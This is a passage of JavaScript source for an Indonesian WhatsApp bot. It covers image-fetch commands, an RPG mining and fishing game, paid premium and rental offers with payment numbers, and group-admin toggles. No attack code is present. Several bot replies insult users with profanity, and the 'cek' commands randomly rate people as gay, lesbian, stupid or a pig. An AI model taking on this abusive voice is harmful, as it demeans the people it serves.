imagenya = await getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`)
pll = `Nih Kak シ︎`
let message = await prepareWAMessageMedia({ image: imagenya }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: pll,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break

case 'art':
case 'bts':
case 'elf':
case 'neko':
case 'shota':
case 'sagiri':
case 'shinobu':
case 'megumin':
case 'wallnime':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
hasil = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`)
pll = `Nih Kak シ︎`
let message = await prepareWAMessageMedia({ image: hasil }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: pll,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Next","id": `${prefix + command}`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'rpgmenu':
case 'profile':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
await sendButLoc(from)
break
case 'joinrpg':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group)  
if (isPetualang) return replyNya('Kamu Sudah Menjadi Petualang')
if (args.length < 1) return replyNya(`Kirim perintah ${prefix + command} nama`)
await sendButJoin(from, q)
break
case 'mining':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
pp = randomNomor(75)
emas = randomNomor(15)
dm = randomNomor(3)
besi = randomNomor(50)
addBalance(sender, pp, balance)
addBesi(sender, besi)
addEmas(sender, emas)
addDm(sender, dm)
mining = ('Waitt Sedang Menguli . . .')
setTimeout( () => {
butkie = [
{ buttonId: 'mining', buttonText: { displayText: 'Mining' }, type: 1 }
]
kirbotz.sendButtonText(m.chat, butkie, `Selesai Mining🚧\nlist hasil :\nEmas : ${emas}🪙\nUang : $${pp}💰\nBesi : ${besi}⛓️\nBerlian : ${dm}💎`, kirbotz.user.name, m)
}, 9000) // 1000 = 1s,
setTimeout( () => {
kirbotz.sendMessage(from, { text: '🚧 Selesai Menguli . . .🪙👷' }, { quoted: fakekirbotz })
}, 7000) // 1000 = 1s,
setTimeout( () => {
kirbotz.sendMessage(from, { text: '🚧 Menemukan Emas . . .⚒️🏔️️️' }, { quoted: fakekirbotz })
}, 4000) // 1000 = 1s,
setTimeout( () => {
kirbotz.sendMessage(from, { text: '🚧 Mulai Menambang . . .⚒️🏔️️' }, { quoted: fakekirbotz })
}, 1500) // 1000 = 1s,
setTimeout( () => {
kirbotz.sendMessage(from, { text: mining }, {quoted: fakekirbotz}) 
}, 0) // 1000 = 1s,
break
case 'inventori':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
var reqXp  = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
buttonnss = [
{ buttonId: 'adventure', buttonText: { displayText: 'Adventure' }, type: 1 }
]
kirbotz.sendButtonText(m.chat, buttonnss, `📍 𝗣𝗿𝗼𝗳𝗶𝗹𝗲 𝗣𝗹𝗮𝘆𝗲𝗿\n • Nama : ${pushname}\n • Rank : ${role}\n • Status : ${elit}\n • Xp : ${getLevelingXp(sender)}/${reqXp}\n • Level : ${getLevelingLevel(sender)}\n🎒 𝗜𝗻𝘃𝗲𝗻𝘁𝗼𝗿𝗶 :\n • Emas : ${getEmas(sender)}🪙\n • Uang : $${(getBalance(sender, balance))}💰\n • Besi : ${getBesi(sender)}⛓️\n • Berlian : ${getDm(sender)}💎\n • Ikan : ${getFish(sender)}🎣`, kirbotz.user.name, m)
break
case 'sellikan':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
if (args.length < 1) return replyNya(`Kirim perintah *${prefix + command}* jumlah yang ingin dijual`)
jmlh = body.slice(10)
rp = 5 * jmlh
if (getFish(sender) < jmlh) return replyNya(`Ikan Kamu Tidak Cukup`)
sellFish(sender, jmlh, balance)
addBalance(sender, rp, balance) 
buttotons = [
{ buttonId: 'inventori', buttonText: { displayText: 'Inventori' }, type: 1 }
]
kirbotz.sendButtonText(m.chat, buttotons, `🛒 𝗣𝗔𝗦𝗔𝗥\n • Penjual : ${pushname}\n • Pembeli : Admin\n • Harga/Ikan : 5\n • Status : Sukses\n • Sisa Ikan : ${getFish(sender)}\n • Hasil Penjualan : $${rp}`,  kirbotz.user.name, m)
break
case 'sellbesi':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
if (args.length < 1) return replyNya(`Kirim perintah *${prefix + command}* jumlah yang ingin dijual`)
jmlh = body.slice(10)
rp = 10 * jmlh
if (getBesi(sender) < jmlh) return replyNya(`Besi Kamu Tidak Cukup`)
sellBesi(sender, jmlh, balance)
addBalance(sender, rp, balance) 
butbes = [
{ buttonId: 'inventori', buttonText: { displayText: 'Inventori' }, type: 1 }
]
kirbotz.sendButtonText(m.chat, butbes, `🛒 𝗣𝗔𝗦𝗔𝗥\n • Penjual : ${pushname}\n • Pembeli : Admin\n • Harga/Besi : 10\n • Status : Sukses\n • Sisa Besi : ${getBesi(sender)}\n • Hasil Penjualan : $${rp}`, kirbotz.user.name, m)
break
case 'sellemas':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
if (args.length < 1) return replyNya(`Kirim perintah *${prefix + command}* jumlah yang ingin dijual`)
jmlh = body.slice(10)
rp = 25 * jmlh
if (getEmas(sender) < jmlh) return replyNya(`Emas Kamu Tidak Cukup`)
sellEmas(sender, jmlh, balance)
addBalance(sender, rp, balance) 
butem = [
{ buttonId: 'inventori', buttonText: { displayText: 'Inventori' }, type: 1 }
]
kirbotz.sendButtonText(m.chat, butem, `🛒 𝗣𝗔𝗦𝗔𝗥\n • Penjual : ${pushname}\n • Pembeli : Admin\n • Harga/Emas : 25\n • Status : Sukses\n • Sisa Emas : ${getEmas(sender)}\n • Hasil Penjualan : $${rp}`, kirbotz.user.name, m)
break 
case 'selldiamond':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
if (args.length < 1) return replyNya(`Kirim perintah *${prefix + command}* jumlah yang ingin dijual`)
ttl = body.slice(13)
var etoo = 75 * ttl
if (getDm(sender) < ttl) return replyNya(`Besi Kamu Tidak Cukup`)
sellDm(sender, ttl)
addBalance(sender, etoo, balance) 
butdi = [
{ buttonId: 'inventori', buttonText: { displayText: 'Inventori' }, type: 1 }
]
kirbotz.sendButtonText(m.chat, butdi, `🛒 𝗣𝗔𝗦𝗔𝗥\n • Penjual : ${pushname}\n • Pembeli : Admin\n • Harga/Dm : 75\n • Status : Sukses\n • Sisa Diamond : ${getDm(sender)}\n • Hasil Penjualan : $${etoo}`, kirbotz.user.name, m)
break 
case 'mancing':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
ikannya = ikan[Math.floor(Math.random() * ikan.length)]
xp = Math.ceil(Math.random() * 350)
coin = randomNomor(50)	    
ditangkap = Math.ceil(Math.random() * 50)
cing = await getBuffer(`https://telegra.ph/file/d9b15de4f661808dfd0b9.jpg`)
setTimeout( () => {
var button = [
		{ urlButton: { displayText: `Script`, url : `${wame}` } },
		{ quickReplyButton: { displayText: `Inventori`, id: `${prefix}inventori` } },
		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
		]
        var hg = `「 Memancing 」\n\n • Tangkapan : ${ikannya}\n • Total Dapat : ${ditangkap} Ikan\n • MONEY : $${coin}\n • EXP : ${xp}Xp`
        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: cing }, templateButtons: button, footer: `Rpg Game By KirBotz`, mentions: [sender] })
        .catch ((err) => reply(mess.error))
}, 6000)
setTimeout( () => {
kirbotz.sendMessage(from, { text: 'Berhasil Mendapatkan Ikan . . .' }, { quoted: fakekirbotz })
}, 5000) // 1000 = 1s,
setTimeout( () => {
kirbotz.sendMessage(from, { text: '🎣 Menarik Kail. . .' }, { quoted: fakekirbotz })
}, 3000) // 1000 = 1s,
setTimeout( () => {
kirbotz.sendMessage(from, { text: '🎣 Mulai Memancing . . .' }, { quoted: fakekirbotz })
}, 1500) // 1000 = 1s,
addFish(sender, ditangkap)
addLevelingXp(sender, xp)
addBalance(sender, coin, balance) 
break
case 'adventure':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
ngab = ['Longsor','Letusan Gunung','Tsunami','Gempa Bumi','Meteor','Demon']
var sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
var dungeon =['Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','Mansfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
anu = fs.readFileSync('./Lib/dungeon.js');
var ad = dungeon[Math.floor(Math.random() * dungeon.length)]
jsonData = JSON.parse(anu);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasm = await getBuffer(randKey.result)  
var adven = Math.ceil(Math.random() * 1000)
var money = Math.ceil(Math.random() * 300)
setTimeout( () => {		
var button = [
		{ urlButton: { displayText: `Script`, url : `${wame}` } },
		{ quickReplyButton: { displayText: `Inventori`, id: `${prefix}inventori` } },
		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
		]
        var hg = `「 DEATH 」\n\n • Tempat  ${ad}\n • MONEY : $${money}\n • EXP : ${adven}Xp`
        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: hasm }, templateButtons: button, footer: `Rpg Game By KirBotz`, mentions: [sender] })
        .catch ((err) => reply(mess.error))
}, 7000)
setTimeout( () => {
kirbotz.sendMessage(from, { text: `Awass` }, { quoted: fakekirbotz })
}, 5000) // 1000 = 1s,
setTimeout( () => {
kirbotz.sendMessage(from, { text: `Tiba Tiba Ada ${sesuatu}` }, { quoted: fakekirbotz })
}, 3000) // 1000 = 1s,
setTimeout( () => {
kirbotz.sendMessage(from, { text: `${pushname} Sedang Bertualang` }, { quoted: fakekirbotz })
}, 1500) // 1000 = 1s,
addLevelingXp(sender, adven)
addBalance(sender, money, balance)
break
case 'luckyday':
case 'luckytime':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
{
ez = Math.ceil(Math.random() * 450)
a = randomNomor(99)
b = randomNomor(500)
c = randomNomor(150)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
addEmas(sender, a)
addBesi(sender, c)
butluck = [
{ buttonId: `${command}`, buttonText: { displayText: `Next Lucky` }, type: 1 }
]
kirbotz.sendButtonText(m.chat, butluck, `🎰 Lucky\n• Uang : $${b}\n• Emas : ${a}\n• Besi : ${c}\n• Xp : ${ez}`, kirbotz.user.name, m)
}
break
case 'cecan2':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
imgd = await fetchJson('https://spybot-api.herokuapp.com/api/asupan/cecan?apikey=SpyBotApi')
pll = `Nih Kak シ︎`
let message = await prepareWAMessageMedia({ image: { url: imgd.result.url } }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: pll,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Next","id": `${prefix + command}`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'hijaber':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
imgd = await fetchJson('https://spybot-api.herokuapp.com/api/asupan/hijaber?apikey=SpyBotApi')
pll = `Nih Kak シ︎`
let message = await prepareWAMessageMedia({ image: { url: imgd.result.url } }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: pll,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Next","id": `${prefix + command}`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'cecan':
case 'cogan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
imagenya = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`)
pll = `Nih Kak シ︎`
let message = await prepareWAMessageMedia({ image: imagenya }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: pll,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Next","id": `${prefix + command}`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'buypremium': case 'sewabot': {
ya = '```'
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
sewbot = `Hai *${pushname}*

List Sewabot
7k/Minggu
14k/Bulan
25k/Manent
Note : *Keuntungan Sewabot?*
Bisa Masukin Bot Ke Group

List Premium
10k/Minggu
20k/Bulan
40k/Manent
Note : *Keuntungan Premium?*
Bisa Gunain Fitur Premium Tanpa Batas

List Sewabot & Premium
17k/Minggu
34k/Bulan
50k/Manent
Note : *Keuntungan Sewabot & Premium?*
Bisa Masukin Bot Ke Group & Bisa Gunain Fitur Premium Tanpa Batas

List Payment
GOPAY : 0877-0504-8235
OVO : 0877-0504-8235
QRIS ALL : Scan Di Atas

Note : MAU SEWA & PREM APA MAU LIAT DOANG ANJING
${ya}Jika Sudah Membayar Silahkan Kirim Bukti Screenshot Ke Button Url Di Bawah${ya}`
let message = await prepareWAMessageMedia({ image: fs.readFileSync('./Image/gopaykir.jpg') }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: sewbot,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [
{
urlButton: {
displayText: 'Owner KirBotz',
url: 'https://wa.me/62881036690566'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'payment': case 'donasi': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
donte = `_MAU BAYAR YA KAK_
GOPAY : 0877-0504-8235
OVO : 0877-0504-8235
QRIS ALL : Scan Di Atas

*NOTE :*
MAU BAYAR APA LIAT DOANG ANJING
JIKA SUDAH BAYAR KIRIM BUKTI 
SCREENSHOT KE NOMOR OWNER`
let message = await prepareWAMessageMedia({ image: fs.readFileSync('./Image/gopaykir.jpg') }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: donte,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'join': {
if (!isCreator) throw mess.owner
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
sticWait(from)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await kirbotz.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'linkgroup': case 'linkgc': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
let response = await kirbotz.groupInviteCode(m.chat)
kirbotz.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'antilink':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) return replyNya(mess.group)
if (!isGroupAdmins && !isCreator) return replyNya(mess.admin)
if (!isBotAdmins) return replyNya(mess.botAdmin)
if (args[0] === "on") {
if (global.db.data.chats[m.chat].antilink) return replyNya('Sudah Aktif Sebelumnya')
global.db.data.chats[m.chat].antilink = true
replyNya(`Antilink Berhasil Di Aktifkan !`)
} else if (args[0] === "off") {
if (!global.db.data.chats[m.chat].antilink) return replyNya('Sudah Nonaktif Sebelumnya')
global.db.data.chats[m.chat].antilink = false
replyNya(`Antilink Berhasil Di Nonaktifkan !`)
} else {
let buttons = [
{ buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
]
await kirbotz.sendButtonText(m.chat, buttons, `Mode Antilink`, kirbotz.user.name, m)
}
break
case 'antiwame':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) return replyNya(mess.group)
if (!isGroupAdmins && !isCreator) return replyNya(mess.admin)
if (!isBotAdmins) return replyNya(mess.botAdmin)
if (args[0] === "on") {
if (global.db.data.chats[m.chat].antiwame) return replyNya('Sudah Aktif Sebelumnya')
global.db.data.chats[m.chat].antiwame = true
replyNya(`Antilink Berhasil Di Aktifkan !`)
} else if (args[0] === "off") {
if (!global.db.data.chats[m.chat].antiwame) return replyNya('Sudah Nonaktif Sebelumnya')
global.db.data.chats[m.chat].antiwame = false
replyNya(`Antilink Berhasil Di Nonaktifkan !`)
} else {
let buttons = [
{ buttonId: 'antiwame on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'antiwame off', buttonText: { displayText: 'Off' }, type: 1 }
]
await kirbotz.sendButtonText(m.chat, buttons, `Mode Antiwame`, kirbotz.user.name, m)
}
break
case 'listgc': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) return replyNya(mess.group)
let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `     「 List Group Chat 」\n\nThere are ${anu.length} users using bot in group chat`
for (let i of anu) {
 let metadata = await kirbotz.groupMetadata(i)
 if (metadata.owner === "undefined") {
 loldd = false
 } else {
 loldd = metadata.owner
 }
 teks += `\n\nName : ${metadata.subject ? metadata.subject : "undefined"}\nOwner : ${loldd ? '@' + loldd.split("@")[0] : "undefined"}\nID : ${metadata.id ? metadata.id : "undefined"}\nDibuat : ${metadata.creation ? moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') : "undefined"}\nMember : ${metadata.participants.length ? metadata.participants.length : "undefined"}`
}
kirbotz.sendTextWithMentions(m.chat, teks, m)
}
break
case 'autosticker':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) return replyNya(mess.group)
if (!isGroupAdmins && !isCreator) return replyNya(mess.admin)
if (!isBotAdmins) return replyNya(mess.botAdmin)
					if (args[0] === '1') {
					if (isAutoSticker) return replyNya('Sudah Aktif Sebelumnya')
					autosticker.push(from)
					fs.writeFileSync('./Database/autosticker.json', JSON.stringify(autosticker))
replyNya(`Autosticker Berhasil Di Aktifkan !`)
					} else if (args[0] === '0') {
					autosticker.splice(from, 1)
						fs.writeFileSync('./Database/autosticker.json', JSON.stringify(autosticker))
replyNya(`Autosticker Berhasil Di Nonaktifkan !`)
					} else {
let buttons = [
{ buttonId: 'autosticker 1', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'autosticker 0', buttonText: { displayText: 'Off' }, type: 1 }
]
await kirbotz.sendButtonText(m.chat, buttons, `Mode Autosticker`, kirbotz.user.name, m)
}
					break
case 'group': case 'grup': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === 'close'){
await kirbotz.groupSettingUpdate(m.chat, 'announcement').then((res) => replyNya(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await kirbotz.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replyNya(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
]
await kirbotz.sendButtonText(m.chat, buttons, `Mode Group`, kirbotz.user.name, m)
}
}
break
case 'welcome': {
if (!m.isGroup) return
await replyTemplate(`Welcome Kak\nJangan Lupa Baca Deskripsi\nPatuhi Rules Bot!!!`)
}
break
case 'bye': {
if (!m.isGroup) return
await replyTemplate(`Awogwogwog Anak Kontol Baru Aja Keluar🗿`)
}
break
case 'apakah':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (args.length < 1) return replyNya(`Contoh : ${prefix}apakah aku jelek`)
query = args.join(" ")
naon = ['Iya','Tidak','Mungkin']
random = naon[Math.floor(Math.random() * (naon.length))]
tz = `Pertanyaan = ${command} ${query}
Jawaban = ${random}`
replyNya(tz)
}
break
case 'goblokcek': case 'jelekcek': case 'gaycek':
case 'lesbicek':case 'gantengcek': case 'cantikcek':case 'begocek': case 'suhucek':case 'pintercek':
case 'jagocek':case 'nolepcek':case 'babicek':case 'bebancek':case 'baikcek':
case 'jahatcek':case 'anjingcek':case 'haramcek':case 'pakboycek':
case 'pakgirlcek':case 'sangecek': case 'bapercek':case 'fakboycek':case 'alimcek':case 'suhucek':
case 'fakgirlcek':case 'kerencek':case 'wibucek':case 'pasarkascek':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (args.length < 1) return replyNya(`Contoh : ${prefix + command} KirBotz`)
cantik = body.slice(1)
const eyy =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const yn = eyy[Math.floor(Math.random() * eyy.length)]
kirbotz.sendMessage(m.chat, { text: `${yn}%` }, { quoted: fakekirbotz })
break
case 'jadian': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee Yang Jadian💖 Jangan Lupa Pajak Jadiannya Yaa🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'Jadian' }, type: 1 }
]
await kirbotz.sendButtonText(m.chat, buttons, jawab, kirbotz.user.name, m, {mentions: menst})
}
break
case 'bisakah':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
